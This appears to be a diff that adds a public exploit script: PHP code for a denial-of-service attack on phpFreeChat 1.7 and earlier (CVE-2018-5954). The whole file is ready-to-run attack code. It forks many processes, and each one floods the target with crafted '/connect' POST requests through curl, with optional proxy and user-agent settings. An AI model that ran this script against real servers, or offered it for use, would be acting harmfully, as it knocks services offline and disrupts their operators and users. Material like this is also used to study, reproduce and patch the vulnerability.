@@ -1,0 +1,47 @@
+# Exploit Title: phpFreeChat 1.7 and earlier - Denial of Service
+# Version: 1.7 and earlier
+# Date: 21/01/2018
+# Vendor Homepage: http://www.phpfreechat.net
+# Software Link: http://www.phpfreechat.net/download
+# Exploit Author: A. Pakbaz
+# CVE : CVE-2018-5954
+####################################################
+<?php
+$host="http://example.com/path/index.php";	//Vulnerable Host
+$con_num=64;	//Number of Connections
+$proxy='';	//Proxy example http://127.0.0.1:8080
+$user_agent='';	//User-Agent
+$proxy=$proxy!='' ? "-x " . $proxy : '';
+$user_agent=$user_agent!='' ? "-A " . $user_agent : '';
+echo "##Vulnerability Discovered by A. Pakbaz\n##Exploit Author: A. Pakbaz\n";
+echo "##Contact: \x70\x61\x6b\x62\x61\x7a\x40\x70\x72\x6f\x74\x6f\x6e\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\n";
+echo "##PGP key: \x45\x33\x35\x35\x35\x32\x34\x43\x34\x44\x37\x45\x31\x36\x43\x38\x46\x38\x34\x38\x35\x41\x36\x46\x35\x31\x32\x39\x30\x34\x46\x35\x45\x44\x42\x45\x33\x43\x41\x41\n";
+function runf($id){
+global $con_num;
+global $host;
+global $proxy;
+global $user_agent;
+$i=$id*1000000/$con_num;
+$f=($id+1)*1000000/$con_num;
+for($num=$i; $num<$f; $num++){
+	`curl --url '$host' -X POST -d "pfc_ajax=1&f=handleRequest&cmd=%2Fconnect%20a95806d727683c9c42694214fe"$num"%200%20%22"$num"%22" -N --stderr /dev/null --compressed $proxy $user_agent`;
+	echo ".";	
+	}		
+}
+function fmaker($pno){
+global $con_num;
+if($pno>1){
+	$pid=pcntl_fork();
+	if($pid<0){
+		echo "\nError! Reduce the number of connections\n";
+		}
+	elseif($pid)
+		fmaker($pno-1);
+	else
+		runf($con_num-$pno);
+}
+elseif($pno==1)
+	runf($con_num-1);
+}
+fmaker($con_num);
+?>
